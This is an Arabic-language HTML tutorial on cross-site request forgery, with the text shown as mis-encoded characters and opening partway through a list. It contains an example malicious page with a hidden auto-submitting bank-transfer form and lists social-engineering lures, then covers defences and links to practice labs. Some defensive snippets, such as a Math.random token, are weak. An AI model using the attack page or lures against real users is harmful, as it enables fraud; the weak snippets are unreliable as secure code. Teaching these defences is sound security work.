                    <li>Ø§Ø®ØªØ¨Ø§Ø± Ù†Ù‚Ø§Ø· Ø§Ù„Ø¶Ø¹Ù</li>
                    <li>Ø¥Ù†Ø´Ø§Ø¡ payloads Ù…Ø®ØµØµØ©</li>
                </ul>

                <h3>3. Ø£Ø¯ÙˆØ§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ©</h3>
                <ul>
                    <li>OWASP ZAP</li>
                    <li>Burp Suite Professional</li>
                    <li>CSRF Scanner</li>
                    <li>Custom Scripts</li>
                </ul>

                <div class="warning">
                    <strong>âš ï¸ ØªØ­Ø°ÙŠØ±:</strong> ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø®ØªØ¨Ø§Ø± Ù‡Ø°Ù‡ Ø§Ù„Ø·Ø±Ù‚ ÙÙŠ Ø¨ÙŠØ¦Ø© Ø¢Ù…Ù†Ø© ÙˆÙ…ØµØ±Ø­ Ø¨Ù‡Ø§ ÙÙ‚Ø·!
                </div>
            </div>

            <!-- Ø·Ø±Ù‚ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ -->
            <div class="section">
                <h2>âš”ï¸ Ø·Ø±Ù‚ Ø§Ø³ØªØºÙ„Ø§Ù„ CSRF</h2>
                
                <h3>1. Ø¥Ù†Ø´Ø§Ø¡ ØµÙØ­Ø© Ø®Ø¨ÙŠØ«Ø©</h3>
                <div class="code-block">
&lt;!-- ØµÙØ­Ø© CSRF Ø®Ø¨ÙŠØ«Ø© --&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Ø¹Ø±Ø¶ ØµÙˆØ±Ø© Ø¬Ù…ÙŠÙ„Ø©&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Ø§Ù†Ø¸Ø± Ù„Ù‡Ø°Ù‡ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø¬Ù…ÙŠÙ„Ø©!&lt;/h1&gt;
    
    &lt;!-- CSRF Payload Ù…Ø®ÙÙŠ --&gt;
    &lt;form id="csrf" action="https://bank.com/transfer" method="POST"&gt;
        &lt;input type="hidden" name="to" value="attacker"&gt;
        &lt;input type="hidden" name="amount" value="1000"&gt;
    &lt;/form&gt;
    
    &lt;script&gt;
        // ØªÙ†ÙÙŠØ° Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
        setTimeout(() =&gt; {
            document.getElementById('csrf').submit();
        }, 2000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
                </div>

                <h3>2. Ø§Ø³ØªØ®Ø¯Ø§Ù… Social Engineering</h3>
                <ul>
                    <li>Ø¥Ø±Ø³Ø§Ù„ Ø±ÙˆØ§Ø¨Ø· Ø®Ø¨ÙŠØ«Ø© Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</li>
                    <li>Ø¥Ù†Ø´Ø§Ø¡ ØµÙØ­Ø§Øª Ù…Ø²ÙŠÙØ© Ø¬Ø°Ø§Ø¨Ø©</li>
                    <li>Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø±Ø³Ø§Ø¦Ù„ Ø¹Ø§Ø¬Ù„Ø© ÙˆÙ…Ø®ÙŠÙØ©</li>
                    <li>Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ø«Ù‚Ø© ÙˆØ§Ù„ÙØ¶ÙˆÙ„</li>
                </ul>

                <h3>3. Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ø£Ø®Ø±Ù‰</h3>
                <ul>
                    <li>XSS + CSRF</li>
                    <li>Open Redirect + CSRF</li>
                    <li>Clickjacking + CSRF</li>
                    <li>Session Fixation + CSRF</li>
                </ul>
            </div>

            <!-- Ø§Ù„Ù…Ø®ØªØ¨Ø±Ø§Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© -->
            <div class="section">
                <h2>ğŸ§ª Ø§Ù„Ù…Ø®ØªØ¨Ø±Ø§Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©</h2>
                <p>Ù…Ø¬Ù…ÙˆØ¹Ø© Ù…Ù† Ø§Ù„Ù…Ø®ØªØ¨Ø±Ø§Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ù…Ù† PortSwigger Web Security Academy Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø£Ù†ÙˆØ§Ø¹ CSRF Ø§Ù„Ù…Ø®ØªÙ„ÙØ©:</p>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 1: CSRF vulnerability with no defenses</h4>
                    <p>Ù…Ø®ØªØ¨Ø± Ø£Ø³Ø§Ø³ÙŠ Ù„Ø§Ø®ØªØ¨Ø§Ø± CSRF Ø¨Ø¯ÙˆÙ† Ø£ÙŠ Ø­Ù…Ø§ÙŠØ©</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 2: CSRF where token validation depends on request method</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± CSRF Ù…Ø¹ Ø­Ù…Ø§ÙŠØ© Ø¶Ø¹ÙŠÙØ© ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ù†ÙˆØ¹ Ø§Ù„Ø·Ù„Ø¨</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 3: CSRF where token validation depends on token being present</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± CSRF Ù…Ø¹ Ø­Ù…Ø§ÙŠØ© ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ ÙˆØ¬ÙˆØ¯ Ø§Ù„ØªÙˆÙƒÙ†</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 4: CSRF where Referer validation depends on header being present</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± CSRF Ù…Ø¹ Ø­Ù…Ø§ÙŠØ© ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Referer header</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 5: CSRF with broken Referer validation</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± CSRF Ù…Ø¹ Ø­Ù…Ø§ÙŠØ© Referer Ø¶Ø¹ÙŠÙØ©</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-broken-referer-validation" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 6: CSRF where token is not tied to user session</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± CSRF Ù…Ø¹ ØªÙˆÙƒÙ† ØºÙŠØ± Ù…Ø±ØªØ¨Ø· Ø¨Ø¬Ù„Ø³Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 7: CSRF where token is duplicated in cookie</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± CSRF Ù…Ø¹ ØªÙˆÙƒÙ† Ù…ÙƒØ±Ø± ÙÙŠ Ø§Ù„ÙƒÙˆÙƒÙŠØ²</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="lab-card">
                    <h4>ğŸ”¬ Lab 8: SameSite Lax bypass via method override</h4>
                    <p>Ø§Ø®ØªØ¨Ø§Ø± ØªØ¬Ø§ÙˆØ² Ø­Ù…Ø§ÙŠØ© SameSite Lax Ø¹Ø¨Ø± ØªØºÙŠÙŠØ± Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø·Ù„Ø¨</p>
                    <a href="https://portswigger.net/web-security/csrf/lab-samesite-lax-bypass-via-method-override" target="_blank">
                        Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø®ØªØ¨Ø± â†’
                    </a>
                </div>

                <div class="info">
                    <strong>ğŸ’¡ Ù…Ù„Ø§Ø­Ø¸Ø©:</strong> Ù‡Ø°Ù‡ Ø§Ù„Ù…Ø®ØªØ¨Ø±Ø§Øª ØªØªØ·Ù„Ø¨ Ø­Ø³Ø§Ø¨ ÙÙŠ PortSwigger Web Security Academy. 
                    ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù…Ø¬Ø§Ù†Ø§Ù‹ Ø¹Ù„Ù‰ <a href="https://portswigger.net/web-security" target="_blank">Ù…ÙˆÙ‚Ø¹Ù‡Ù…</a>.
                </div>
            </div>

            <!-- Ø·Ø±Ù‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ© -->
            <div class="section">
                <h2>ğŸ›¡ï¸ Ø·Ø±Ù‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ù…Ù† CSRF</h2>
                
                <h3>1. CSRF Tokens</h3>
                <div class="code-block secure">
&lt;!-- âœ… ÙƒÙˆØ¯ Ø¢Ù…Ù† Ù…Ø¹ CSRF Token --&gt;
&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="hidden" name="csrf_token" value="random_token_here"&gt;
    &lt;input type="text" name="to"&gt;
    &lt;input type="number" name="amount"&gt;
    &lt;button type="submit"&gt;ØªØ­ÙˆÙŠÙ„&lt;/button&gt;
&lt;/form&gt;

&lt;!-- Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù… --&gt;
if (request.csrf_token !== session.csrf_token) {
    return error('Invalid CSRF token');
}
                </div>

                <h3>2. SameSite Cookies</h3>
                <div class="code-block secure">
&lt;!-- âœ… ÙƒÙˆØ¯ Ø¢Ù…Ù† Ù…Ø¹ SameSite --&gt;
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

&lt;!-- Ø£Ùˆ SameSite=Lax Ù„Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø®Ø§Ø±Ø¬ÙŠØ© --&gt;
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly
                </div>

                <h3>3. Double Submit Cookie</h3>
                <div class="code-block secure">
&lt;!-- âœ… ÙƒÙˆØ¯ Ø¢Ù…Ù† Ù…Ø¹ Double Submit --&gt;
&lt;script&gt;
// Ø¥Ù†Ø´Ø§Ø¡ ØªÙˆÙƒÙ† Ø¹Ø´ÙˆØ§Ø¦ÙŠ
const token = Math.random().toString(36).substr(2, 9);
document.cookie = `csrf_token=${token}; SameSite=Strict`;

// Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ† Ù„Ù„Ù†Ù…ÙˆØ°Ø¬
document.getElementById('csrf_token').value = token;
&lt;/script&gt;
                </div>

                <h3>4. Custom Headers</h3>
                <div class="code-block secure">
&lt;!-- âœ… ÙƒÙˆØ¯ Ø¢Ù…Ù† Ù…Ø¹ Custom Header --&gt;
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'token_here',
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: JSON.stringify(data)
});
                </div>

                <h3>5. Referer Validation</h3>
                <div class="code-block secure">
&lt;!-- âœ… ÙƒÙˆØ¯ Ø¢Ù…Ù† Ù…Ø¹ Referer Check --&gt;
function validateReferer(request) {
    const referer = request.headers.referer;
    const allowedDomains = ['example.com', 'www.example.com'];
    
    if (!referer) {
        return false;
    }
    
    const url = new URL(referer);
    return allowedDomains.includes(url.hostname);
}
                </div>

                <div class="success">
                    <strong>âœ… Ø£ÙØ¶Ù„ Ø§Ù„Ù…Ù…Ø§Ø±Ø³Ø§Øª:</strong>
                    <ul>
                        <li>Ø§Ø³ØªØ®Ø¯Ù… CSRF tokens Ù„ÙƒÙ„ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬</li>
                        <li>Ø·Ø¨Ù‚ SameSite=Strict Ù„Ù„ÙƒÙˆÙƒÙŠØ² Ø§Ù„Ø­Ø³Ø§Ø³Ø©</li>
                        <li>ØªØ­Ù‚Ù‚ Ù…Ù† Referer header</li>
                        <li>Ø§Ø³ØªØ®Ø¯Ù… Custom headers Ù„Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…Ù‡Ù…Ø©</li>
                        <li>Ø·Ø¨Ù‚ Ù…Ø¨Ø¯Ø£ "Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ø¯Ù†ÙŠØ§"</li>
                    </ul>
                </div>
            </div>

            <!-- Ø£Ù…Ø«Ù„Ø© Ø¹Ù…Ù„ÙŠØ© -->
            <div class="section">
                <h2>ğŸ’» Ø£Ù…Ø«Ù„Ø© Ø¹Ù…Ù„ÙŠØ©</h2>
                
                <h3>Ù…Ø«Ø§Ù„ 1: Ø­Ù…Ø§ÙŠØ© Ù†Ù…ÙˆØ°Ø¬ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h3>
                <div class="code-block secure">
&lt;!-- âœ… Ù†Ù…ÙˆØ°Ø¬ Ø¢Ù…Ù† --&gt;
&lt;form action="/login" method="POST"&gt;
    &lt;input type="hidden" name="csrf_token" value="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;
    &lt;input type="email" name="email" required&gt;
    &lt;input type="password" name="password" required&gt;
    &lt;button type="submit"&gt;ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„&lt;/button&gt;
&lt;/form&gt;

&lt;!-- PHP Validation --&gt;
&lt;?php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF attack detected!');
}
?&gt;
                </div>

                <h3>Ù…Ø«Ø§Ù„ 2: Ø­Ù…Ø§ÙŠØ© API endpoint</h3>
                <div class="code-block secure">
&lt;!-- âœ… API Ø¢Ù…Ù† --&gt;
// Middleware Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† CSRF
app.use('/api', (req, res, next) =&gt; {
    const token = req.headers['x-csrf-token'];
    const sessionToken = req.session.csrf_token;
    
    if (token !== sessionToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    
    next();
});

// Endpoint Ù…Ø­Ù…ÙŠ
app.post('/api/transfer', (req, res) =&gt; {
    // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨ Ø¨Ø£Ù…Ø§Ù†
    res.json({ success: true });
});
                </div>

                <h3>Ù…Ø«Ø§Ù„ 3: Ø­Ù…Ø§ÙŠØ© AJAX requests</h3>
                <div class="code-block secure">
&lt;!-- âœ… AJAX Ø¢Ù…Ù† --&gt;
&lt;script&gt;
// Ø¥Ø¶Ø§ÙØ© CSRF token Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø·Ù„Ø¨Ø§Øª
$.ajaxSetup({
    beforeSend: function(xhr) {
        xhr.setRequestHeader('X-CSRF-Token', getCSRFToken());
    }
});

function getCSRFToken() {
    return document.querySelector('meta[name="csrf-token"]').getAttribute('content');
}

// Ø·Ù„Ø¨ Ø¢Ù…Ù†
$.post('/api/update-profile', {
    name: 'New Name',
    email: 'new@email.com'
});
&lt;/script&gt;
                </div>
            </div>

            <!-- Ø§Ù„Ø®Ù„Ø§ØµØ© -->
            <div class="section">
                <h2>ğŸ“ Ø§Ù„Ø®Ù„Ø§ØµØ©</h2>
                
                <div class="warning">
                    <strong>ğŸ¯ Ø§Ù„Ù†Ù‚Ø§Ø· Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©:</strong>
                    <ul>
                        <li>CSRF Ù‡ÙŠ Ø«ØºØ±Ø© Ø®Ø·ÙŠØ±Ø© ØªØ³Ù…Ø­ Ø¨ØªÙ†ÙÙŠØ° Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª ØºÙŠØ± Ù…Ø±ØºÙˆØ¨ ÙÙŠÙ‡Ø§</li>
                        <li>Ù‡Ù†Ø§Ùƒ 5 Ø£Ù†ÙˆØ§Ø¹ Ø±Ø¦ÙŠØ³ÙŠØ© Ù…Ù† CSRF</li>
                        <li>Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ù‡ÙŠ CSRF tokens</li>
                        <li>SameSite cookies ØªØ­Ù…ÙŠ Ù…Ù† Ù…Ø¹Ø¸Ù… Ø§Ù„Ù‡Ø¬Ù…Ø§Øª</li>
                        <li>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Referer header ÙŠØ¶ÙŠÙ Ø·Ø¨Ù‚Ø© Ø­Ù…Ø§ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ©</li>
                    </ul>
                </div>

                <div class="success">
                    <strong>âœ… Ø®Ø·ÙˆØ§Øª Ø§Ù„Ø­Ù…Ø§ÙŠØ©:</strong>
                    <ol>
                        <li>Ø§Ø³ØªØ®Ø¯Ù… CSRF tokens ÙÙŠ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬</li>
                        <li>Ø·Ø¨Ù‚ SameSite=Strict Ù„Ù„ÙƒÙˆÙƒÙŠØ² Ø§Ù„Ø­Ø³Ø§Ø³Ø©</li>
                        <li>ØªØ­Ù‚Ù‚ Ù…Ù† Referer header</li>
                        <li>Ø§Ø³ØªØ®Ø¯Ù… Custom headers Ù„Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…Ù‡Ù…Ø©</li>
                        <li>Ø§Ø®ØªØ¨Ø± ØªØ·Ø¨ÙŠÙ‚Ùƒ Ø¨Ø§Ù†ØªØ¸Ø§Ù…</li>
                        <li>Ø§Ø¨Ù‚ Ø¹Ù„Ù‰ Ø§Ø·Ù„Ø§Ø¹ Ø¨Ø£Ø­Ø¯Ø« Ø§Ù„ØªÙ‡Ø¯ÙŠØ¯Ø§Øª</li>
                    </ol>
                </div>

                <div class="info">
                    <strong>ğŸ”— Ø±ÙˆØ§Ø¨Ø· Ù…ÙÙŠØ¯Ø©:</strong>
                    <ul>
                        <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP CSRF Guide</a></li>
                        <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger CSRF</a></li>
                        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies" target="_blank">MDN SameSite Cookies</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({ startOnLoad: true });
    </script>
</body>
</html> 